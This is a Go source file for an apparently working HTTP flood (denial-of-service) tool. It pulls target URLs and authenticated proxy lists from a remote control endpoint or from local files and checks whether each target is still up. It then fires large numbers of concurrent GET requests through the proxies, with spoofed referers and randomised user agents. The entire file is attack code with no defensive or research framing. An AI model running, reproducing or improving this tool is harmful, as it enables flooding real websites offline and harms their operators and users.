package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/joho/godotenv"
)

var (
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8f|Accept-Language: en-US,en;q=0.5f|Accept-Encoding: gzip, deflatef",
		"Accept-Encoding: gzip, deflatef",
		"Accept-Language: en-US,en;q=0.5f|Accept-Encoding: gzip, deflatef",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8f|Accept-Language: en-US,en;q=0.5f|Accept-Charset: iso-8859-1f|Accept-Encoding: gzipf",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5f|Accept-Charset: iso-8859-1f",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8f|Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1f|Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1f|Accept-Charset: utf-8, iso-8859-1;q=0.5f",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*f|Accept-Language: en-US,en;q=0.5f",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*f|Accept-Encoding: gzipf|Accept-Charset: utf-8, iso-8859-1;q=0.5f|Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1f",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1f|Accept-Encoding: gzipf|Accept-Language: en-US,en;q=0.5f|Accept-Charset: utf-8, iso-8859-1;q=0.5f",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8f|Accept-Language: en-US,en;q=0.5f",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5f|Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1f",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5f",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8f|Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1f",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5f|Accept-Charset: iso-8859-1f",
	}
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
)

var (
	GetHostsUrl      = ""
	ProxyApiLogin    = ""
	ProxyApiPassword = ""
	GourutinesCount  = 1
	ShowErrors       = false
)

const REQUEST_TIMEOUT = 15

type UrlAndProxy struct {
	Site  Site    `json:"site"`
	Proxy []Proxy `json:"proxy"`
}

type Site struct {
	Id           int    `json:"id"`
	Url          string `json:"url"`
	NeedParseUrl bool   `json:"need_parse_url"`
	Page         string `json:"page"`
	PageTime     string `json:"page_time"`
	Attack       bool   `json:"atack"`
}

type Proxy struct {
	Id   int    `json:"id"`
	Ip   string `json:"ip"`
	Auth string `json:"auth"`
}

func main() {
	fmt.Println("Starting the app... ")

	err := godotenv.Load(".env")
	if err != nil {
		log.Fatalf("Error loading .env file")
	}
	GetHostsUrl = os.Getenv("GET_HOSTS_URL")
	ProxyApiLogin = os.Getenv("PROXY_LOGIN")
	ProxyApiPassword = os.Getenv("PROXY_PASSWORD")
	GourutinesCount, _ = strconv.Atoi(os.Getenv("GOURUTINES_COUNT"))
	ShowErrors, _ = strconv.ParseBool(os.Getenv("SHOW_ERRORS"))
	argsWithoutProg := os.Args[1:]

	urlAndProxy := new(UrlAndProxy)
	for _, k := range argsWithoutProg {
		if k == "local" {
			for {
				doDirt()
			}
		}
	}

	for {
		// fmt.Println("Request to get proxy...")
		data, err := getInitData()

		if err != nil {
			fmt.Println("Can't get new proxy. Trying to restart...")
			// fmt.Println(err)
			continue
		}

		json.Unmarshal([]byte(data), &urlAndProxy)
		// fmt.Println("Proxy - 200")

		var wg sync.WaitGroup
		urlToFuck := urlAndProxy.Site.Page

		u, err := url.Parse(urlToFuck)
		if err != nil {
			// fmt.Println(err)
			continue
		}

		if u.Scheme == "" {
			urlToFuck = "http://" + urlToFuck
		}

		fmt.Println("URL - " + urlToFuck)
		// fmt.Println("Go f**k them!")
		for _, proxy := range urlAndProxy.Proxy {
			for i := 0; i < GourutinesCount; i++ {
				time.Sleep(time.Microsecond * 100)
				wg.Add(1)
				go sendRequest(urlToFuck, &proxy, &wg)
				os.Stdout.Sync()
			}
		}

		wg.Wait()
	}
}

func doDirt() {
	var siteUrls []string
	var proxyUrls []string

	siteUrls = getSitesUrl()
	proxyUrls = getProxyUrls()

	for _, urlToFuck := range siteUrls {
		if !checkUrl(urlToFuck, proxyUrls) {
			continue
		}
		var wg sync.WaitGroup //@todo mb move upper
		for k, proxyUrl := range proxyUrls {
			proxyOb := new(Proxy)
			proxyOb.Id = k
			proxyOb.Ip = proxyUrl
			proxyOb.Auth = ProxyApiLogin + ":" + ProxyApiPassword

			for i := 0; i < GourutinesCount; i++ {
				time.Sleep(time.Millisecond * 100)
				wg.Add(1)
				go sendRequest(urlToFuck, proxyOb, &wg)
			}
		}
		wg.Wait()
	}
}

func getSitesUrl() []string {
	var siteUrls []string
	siteUrlsFile, err := os.Open("sites.json")
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}

	defer siteUrlsFile.Close()

	siteUrlsData, _ := ioutil.ReadAll(siteUrlsFile)
	json.Unmarshal([]byte(siteUrlsData), &siteUrls)

	fmt.Println("Successfully parsed sites.json")
	return siteUrls
}

func getProxyUrls() []string {
	var proxyUrls []string

	proxiesFile, err := os.Open("proxies.txt")
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	scanner := bufio.NewScanner(proxiesFile)
	for scanner.Scan() {
		proxyUrls = append(proxyUrls, scanner.Text())
	}

	fmt.Println("Successfully parsed proxies.txt")

	return proxyUrls
}

func checkUrl(urlToFuck string, proxyUrls []string) bool {
	u, err := url.Parse(urlToFuck)
	if err != nil {
		if ShowErrors {
			fmt.Println(err)
		}
		return false
	}

	if u.Scheme == "" {
		urlToFuck = "http://" + urlToFuck
	}

	fmt.Println("Checking url " + urlToFuck + "...")
	if isSiteDown(urlToFuck, proxyUrls) {
		fmt.Println("Bad url - continue")
		return false
	}
	fmt.Println("Good url! Starting...")
	return true
}

func isSiteDown(urlToFuck string, proxyUrls []string) bool {
	countBad := 0
	var wg sync.WaitGroup
	for i := 0; i < 5; i++ {
		randProxy := proxyUrls[rand.Intn(len(proxyUrls))]
		proxyOb := new(Proxy)
		proxyOb.Id = i
		proxyOb.Ip = randProxy
		proxyOb.Auth = ProxyApiLogin + ":" + ProxyApiPassword

		wg.Add(1)
		if !sendRequest(urlToFuck, proxyOb, &wg) {
			countBad++
		}
	}

	return countBad > 3
}

// @todo deprecated
func getApiData(url string) ([]byte, error) {
	resp, err := http.Get(url)

	if err != nil {
		return []byte{}, fmt.Errorf("GET error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return []byte{}, fmt.Errorf("Status error: %v", resp.StatusCode)
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, fmt.Errorf("Read body: %v", err)
	}

	return data, nil
}

// @todo deprecated
func getInitData() ([]byte, error) {
	url := GetHostsUrl

	apiUrlsResp, err := getApiData(url)
	if err != nil {
		return []byte{}, fmt.Errorf("Read body: %v", err)
	}

	var apiUrls []string
	json.Unmarshal([]byte(apiUrlsResp), &apiUrls)

	data, err := getApiData(apiUrls[rand.Intn(len(apiUrls))])

	if err != nil {
		return []byte{}, fmt.Errorf("Read body: %v", err)
	}

	return data, nil
}

func sendRequest(urlToFuck string, proxyConf *Proxy, wg *sync.WaitGroup) bool {
	defer wg.Done()
	var proxy = "http://" + proxyConf.Auth + "@" + strings.TrimSuffix(proxyConf.Ip, "\r")

	proxyURL, err := url.Parse(proxy)
	if err != nil {
		if ShowErrors {
			log.Println(err)
		}
		return false
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Second * REQUEST_TIMEOUT, //@todo think about enabling that
	}

	currentTime := time.Now()

	request, err := http.NewRequest("GET", urlToFuck, nil)
	if err != nil {
		if ShowErrors {
			fmt.Println(currentTime.Format("15:04:05"), " | Bad request: "+err.Error()+" | 0")
		}
		return false
	}

	request.Header = http.Header{
		"Host": []string{urlToFuck},
		// "Connection":    []string{getuseragent()},
		"Cache-Control": []string{"max-age=0"},
		"Referer":       []string{referers[rand.Intn(len(referers))]},
		// acceptall[rand.Intn(len(acceptall))],
	}

	// acceptAllHeaders := acceptall[rand.Intn(len(acceptall))]

	response, err := client.Do(request)
	if err != nil {
		if ShowErrors {
			fmt.Println(currentTime.Format("15:04:05"), " | Bad response: "+err.Error()+" | 0")
		}
		return false
	}
	defer response.Body.Close()

	if (response.StatusCode < http.StatusOK) || (response.StatusCode > http.StatusFound) {
		if ShowErrors {
			fmt.Println("Bad response: " + strconv.Itoa(response.StatusCode))
		}
		return false
	}

	fmt.Println(currentTime.Format("15:04:05"), " | Response OK | ", response.StatusCode)
	return true
}

func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

// @todo deprecated

func contain(char string, x string) int {
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}
